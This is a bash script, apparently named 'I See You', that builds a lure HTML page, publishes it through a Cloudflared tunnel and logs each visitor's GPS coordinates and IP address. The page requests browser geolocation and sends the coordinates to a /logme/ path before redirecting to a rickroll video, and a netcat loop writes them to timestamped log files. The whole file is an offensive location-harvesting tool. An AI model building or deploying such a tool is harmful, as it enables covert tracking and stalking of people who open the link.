#!/bin/bash

clear

# ============ CONFIGURATION ============
DEFAULT_PORT=8080
WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
CF_LOG="cf.log"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
MAX_RETRIES=10

# ============ ASK FOR PORT ============
read -p "[?] Enter port to use for local server (default $DEFAULT_PORT): " PORT
PORT=${PORT:-$DEFAULT_PORT}

# ============ PORT CHECK ============
if lsof -i TCP:$PORT &>/dev/null; then
    echo "[!] Port $PORT is already in use. Trying to free it..."
    fuser -k ${PORT}/tcp 2>/dev/null || {
        echo "[✗] Failed to free port $PORT. Choose another one."
        exit 1
    }
fi

# ============ CLEANUP ============
echo "[*] Killing existing processes..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null
pkill -f "nc -l" 2>/dev/null

# ============ DIRECTORY SETUP ============
echo "[*] Creating/clearing directories..."
mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
> "$CF_LOG"
cd "$WEB_DIR" || exit 1

# ============ PAYLOAD ============
echo "[*] Creating payload HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>I See You</title>
    <script>
        function redirectToRickRoll(position) {
            fetch('/logme/' + position.coords.latitude + ',' + position.coords.longitude);
            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
        }
        function failLocation() {
            alert("Location access denied.");
        }
        navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
EOF

# ============ START LOCAL SERVER ============
echo "[*] Starting local server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!
echo "[+] Python server running (PID $SERVER_PID)"

# ============ START CLOUDFLARED ============
echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" --logfile "$CF_LOG" > /dev/null 2>&1 &
CF_PID=$!

echo -n "[*] Waiting for Cloudflared URL"
for ((i = 1; i <= $MAX_RETRIES; i++)); do
    sleep 1
    echo -n "."
    URL=$(grep -oE "https://[-a-zA-Z0-9]+\.trycloudflare\.com" "$CF_LOG" | head -n1)
    if [[ -n "$URL" ]]; then break; fi
done
echo

if [[ -n "$URL" ]]; then
    echo "[✓] Public URL: $URL"
else
    echo "[✗] Failed to get Cloudflared public URL."
    kill $SERVER_PID $CF_PID
    exit 1
fi

echo "[*] Logging to $LOG_FILE..."

# ============ NETCAT LOGGER ============
(
    while true; do
        nc -l -p "$PORT" | while read -r line; do
            if [[ "$line" == *"/logme/"* ]]; then
                GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
                IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
                echo "[$(date)] GPS: $GPS | IP: ${IP:-UNKNOWN}" >> "$LOG_FILE"
            fi
        done
    done
) &

# ============ CLEANUP ON EXIT ============
trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID 2>/dev/null; echo "[*] Done."' EXIT

echo "[*] Press Ctrl+C to stop."
wait